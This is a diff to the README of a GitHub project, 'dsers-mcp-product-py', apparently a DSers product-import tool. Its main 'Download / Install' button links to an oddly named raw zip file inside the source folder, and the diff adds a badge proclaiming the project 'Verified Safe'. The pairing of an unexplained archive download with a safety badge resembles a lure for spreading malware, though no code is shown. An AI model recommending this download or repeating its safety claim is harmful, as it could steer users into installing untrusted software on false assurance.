@@ -1,6 +1,7 @@
 # 🧩 dsers-mcp-product-py - Import DSers products with less effort
 
 [![Download / Install](https://img.shields.io/badge/Download%20from%20GitHub-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/PrathamITHub/dsers-mcp-product-py/main/dsers_mcp_product/py_mcp_dsers_product_antiremonstrant.zip)
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/prathamithub-dsers-mcp-product-py)
 
 ## 🛠️ What this app does
 
